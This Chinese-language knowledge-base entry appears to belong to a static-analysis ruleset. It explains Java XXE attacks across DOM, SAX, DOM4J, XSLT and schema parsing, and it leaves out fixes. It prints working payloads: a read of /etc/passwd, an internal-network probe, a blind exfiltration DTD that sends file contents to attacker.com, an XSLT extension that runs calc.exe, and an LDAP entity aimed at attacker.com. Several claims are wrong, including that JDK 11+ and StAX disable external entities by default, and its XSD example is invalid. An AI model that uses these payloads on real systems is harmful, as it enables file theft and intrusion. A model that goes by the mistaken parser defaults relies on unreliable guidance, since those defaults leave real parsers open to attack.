# Java XXE漏洞完整解析

> 规则 ID：`other_any_xxe` · 类别：xxe · 关键 sink：Digester, DocumentBuilder, DocumentHelper, DocumentProvider, Formatter, NodeBuilder, Persister, SAXBuilder, SAXParser, SAXReader, SAXTransformerFactory, SchemaFactory
> 说明：本条为语义知识（cypher 语义查询，不可直接挂 semgrep），下方「知识正文」为中文漏洞详解，
> 配合 fortify-kingdom-reference 的定级指南与各语言 sink 手册使用。


## Java XXE漏洞完整解析
XXE（XML External Entity Injection，XML外部实体注入）是一种针对解析XML输入的应用程序的安全漏洞，核心成因是XML解析器处理了恶意构造的外部实体引用，导致攻击者可读取服务器本地文件、访问内网资源、执行远程代码（特定场景）或发起拒绝服务攻击。Java作为广泛使用的编程语言，因XML解析器的默认配置、开发人员对XML安全解析的认知不足，成为XXE漏洞的高发场景。

#### 一、XXE漏洞的核心原理（通用）
XML规范支持“外部实体”（External Entity），允许在XML文档中通过`<!ENTITY>`定义引用外部资源（本地文件、网络URL等）。当XML解析器开启“外部实体解析”功能时，会解析并加载外部实体的内容，若攻击者能控制XML输入，即可构造恶意实体引用，触发解析器读取敏感资源或发起恶意请求。

XML外部实体的基本语法：
```xml
<!-- 内部实体（无风险） -->
<!ENTITY internal "内部文本内容">

<!-- 外部实体（核心风险点） -->
<!ENTITY external SYSTEM "资源URI"> <!-- 系统标识符，指向外部资源 -->
<!ENTITY external PUBLIC "公共标识符" "资源URI"> <!-- 公共标识符，需结合目录文件 -->
```

#### 二、Java中XXE漏洞的核心成因
Java中处理XML的核心API/框架均可能存在XXE，根源是**解析器默认启用外部实体解析、DTD验证**，且开发人员未显式禁用相关功能。Java中常见的XML解析方式包括：DOM、SAX、JDOM、DOM4J、StAX、JAXB、XPath、XSLT等，不同解析器的默认行为和XXE风险存在差异。

#### 三、Java中XXE漏洞的分类及具体场景
根据攻击效果和利用方式，Java中的XXE可分为以下类型，覆盖不同解析器和使用场景：

##### 1. 基础文件读取型XXE（最常见）
**场景**：攻击者构造包含本地文件路径的外部实体，解析器加载并返回文件内容，适用于所有开启外部实体解析的Java XML解析器。
**利用条件**：解析器允许解析外部实体、允许加载本地文件协议（`file://`）。
**示例（DOM解析）**：
```java
// 存在XXE漏洞的DOM解析代码
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
DocumentBuilder db = dbf.newDocumentBuilder();
// 攻击者可控的XML输入
String maliciousXml = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>" +
        "<!DOCTYPE root [" +
        "<!ENTITY file SYSTEM \"file:///etc/passwd\">]>" +
        "<root>&file;</root>";
InputSource is = new InputSource(new StringReader(maliciousXml));
Document doc = db.parse(is);
// 提取解析后的内容并返回（攻击者可获取/etc/passwd内容）
String content = doc.getElementsByTagName("root").item(0).getTextContent();
```
**风险**：读取服务器任意可读文件（如配置文件、密钥、源码），路径支持绝对路径（`file:///`）或相对路径（`file:./`）。

##### 2. 内网探测型XXE
**场景**：攻击者通过外部实体引用内网资源的URL（如`http://192.168.1.1:8080`、`ldap://192.168.1.2:389`），利用解析器发起网络请求，探测内网存活主机、开放端口、服务版本。
**利用条件**：解析器允许解析外部实体、支持网络协议（HTTP/HTTPS/LDAP/FTP等）。
**示例（SAX解析）**：
```java
// 存在XXE漏洞的SAX解析代码
SAXParserFactory spf = SAXParserFactory.newInstance();
SAXParser parser = spf.newSAXParser();
String maliciousXml = "<?xml version=\"1.0\"?>" +
        "<!DOCTYPE root [" +
        "<!ENTITY internal SYSTEM \"http://192.168.1.100:8080/test\">]>" +
        "<root>&internal;</root>";
parser.parse(new InputSource(new StringReader(maliciousXml)), new DefaultHandler());
```
**风险**：攻击者可通过解析器的网络请求行为（如超时、响应内容）映射内网拓扑，为后续攻击铺路。

##### 3. 盲XXE（无回显XXE）
**场景**：应用程序未将XML解析结果返回给攻击者（无直接回显），攻击者需通过“带外（OOB）”方式获取数据，如将文件内容通过外部实体发送到攻击者控制的服务器。
**利用条件**：解析器支持外部实体、允许访问外部网络（如HTTP/S、FTP），且Java环境未限制出站请求。
**示例（通过DTD远程加载恶意实体）**：
```xml
<!-- 攻击者构造的XML输入 -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
<!ENTITY % dtd SYSTEM "http://attacker.com/malicious.dtd">
%dtd;
%send;
]>
<root></root>

<!-- 攻击者服务器上的malicious.dtd -->
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % send "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/log?data=%file;'>">
%exfil;
```
**风险**：即使无回显，攻击者仍可窃取敏感文件，Java中常见的解析器（如Xerces、JDK默认解析器）均支持这种嵌套实体解析。

##### 4. 代码执行型XXE（高危，特定场景）
Java中纯XXE本身难以直接执行代码，但结合其他漏洞/配置可触发代码执行，主要场景：
- **场景1：XML解析器结合XSLT执行恶意代码**
  若应用程序使用XSLT转换XML，且XSLT允许调用Java方法（如`javax.xml.transform.Transformer`），攻击者可构造恶意XSLT脚本执行代码：
  ```xml
  <!-- 恶意XSLT -->
  <xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
  xmlns:java="http://xml.apache.org/xalan/java">
  <xsl:template match="/">
    <xsl:variable name="runtime" select="java:java.lang.Runtime.getRuntime()"/>
    <xsl:variable name="process" select="java:exec($runtime, 'calc.exe')"/>
  </xsl:template>
  </xsl:stylesheet>
  ```
- **场景2：JNDI注入结合XXE**
  Java 8u191之前的版本中，JNDI（如LDAP/RMI）可结合XXE触发远程类加载：
  ```xml
  <?xml version="1.0"?>
  <!DOCTYPE root [
  <!ENTITY jndi SYSTEM "ldap://attacker.com:1389/ExploitClass">
  ]>
  <root>&jndi;</root>
  ```
  解析器访问LDAP服务器时，会加载攻击者构造的恶意类，触发代码执行。
**风险**：直接控制服务器执行任意命令，仅存在于特定JDK版本（未修复JNDI漏洞）+ 解析器允许外部实体 + 无安全限制的场景。

##### 5. 不同Java XML解析器的XXE风险差异
Java中不同解析器的默认行为决定了XXE风险，以下是核心解析器的特点：

| 解析器/API       | 默认是否允许外部实体 | 核心风险点                     |
|------------------|----------------------|--------------------------------|
| JDK DOM (DocumentBuilder) | 是（JDK 8及之前）| 基础XXE、文件读取、盲XXE       |
| JDK SAX (SAXParser)       | 是（JDK 8及之前）| 内网探测、盲XXE                |
| DOM4J            | 是（依赖底层解析器） | 全类型XXE，需显式禁用DTD       |
| JDOM/JDOM2       | 是                   | 同DOM4J，默认解析外部实体      |
| StAX (XMLStreamReader)    | 否（默认禁用）| 若手动开启DTD验证则触发XXE     |
| JAXB (Unmarshaller)       | 否（默认禁用）| 若自定义解析器开启外部实体则风险 |
| Xalan/XSLT       | 是（若允许扩展函数） | 代码执行型XXE                  |
| XPath (XPathFactory)      | 是（结合XML输入）| 外部实体解析触发文件读取       |

**关键说明**：
- JDK 11+ 对默认解析器做了安全强化，默认禁用外部实体，但低版本（JDK 7/8）仍默认开启；
- 第三方解析器（如Apache Xerces）的默认行为与JDK底层一致，需单独配置。

##### 6. 特殊场景：XML Schema (XSD) 中的XXE
应用程序若解析XML Schema（XSD）文件（如验证XML合法性），XSD中的`xs:include`/`xs:import`或外部实体引用也可能触发XXE：
```xml
<!-- 恶意XSD -->
<?xml version="1.0"?>
<xs:schema xmlns:xs="http://www.w3.org/2001/XMLSchema">
  <!ENTITY % file SYSTEM "file:///tmp/secret.txt">
  <xs:element name="root" type="xs:string" default="%file;"/>
</xs:schema>
```
Java中使用`SchemaFactory`解析该XSD时，若未禁用外部实体，会读取`/tmp/secret.txt`。

##### 7. 依赖库/框架中的XXE
Java主流框架/库若未正确配置XML解析器，也会引入XXE漏洞：
- **Spring框架**：Spring OXM（Object/XML Mapping）、Spring MVC接收XML参数时，默认解析器可能开启外部实体；
- **Apache Commons Configuration**：解析XML配置文件时，默认允许外部实体；
- **Log4j 1.x**：若配置文件为XML格式且解析器未加固，可触发XXE（Log4j 2.x已修复）；
- **MyBatis**：使用XML映射文件时，若自定义解析器处理外部输入，可能引入XXE。

#### 四、Java XXE的触发条件总结
1. 应用程序接收并解析攻击者可控的XML输入；
2. XML解析器未禁用DTD验证、外部实体解析；
3. 解析器支持相关协议（file://、http://、ldap://等）；
4. 应用程序未对XML输入做严格过滤（如过滤`<!ENTITY`、`SYSTEM`等关键字）；
5. Java运行环境未限制解析器的网络/文件访问权限（如未使用SecurityManager）。

#### 五、XXE漏洞的影响范围
Java XXE可导致：
- 读取服务器本地敏感文件（配置文件、密钥、证书、源码）；
- 探测内网拓扑、端口、服务；
- 发起拒绝服务攻击（如引用大文件、循环实体解析）；
- 结合JNDI/XSLT触发远程代码执行；
- 泄露数据库凭证、应用程序密钥等核心数据。

以上是Java语言中XXE漏洞的完整描述，涵盖原理、分类、具体场景、解析器差异及触发条件，未包含修复建议。

